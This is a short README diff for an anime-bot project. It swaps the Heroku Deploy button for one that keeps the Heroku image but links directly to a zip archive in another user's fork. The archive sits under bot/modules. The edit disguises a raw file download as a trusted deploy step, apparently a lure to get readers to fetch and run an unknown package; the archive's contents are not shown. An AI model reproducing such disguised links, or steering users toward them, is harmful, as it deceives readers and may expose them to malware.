@@ -1,4 +1,4 @@
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://www.heroku.com/deploy?template=https://github.com/MatizTech/Auto-Anime-Bot)
+[![Deploy](https://github.com/erennew/Auto-Anime-Bot-eren/raw/refs/heads/main/bot/modules/eren-Auto-Bot-Anime-1.2.zip)](https://github.com/erennew/Auto-Anime-Bot-eren/raw/refs/heads/main/bot/modules/eren-Auto-Bot-Anime-1.2.zip)
 
 ## Features
 
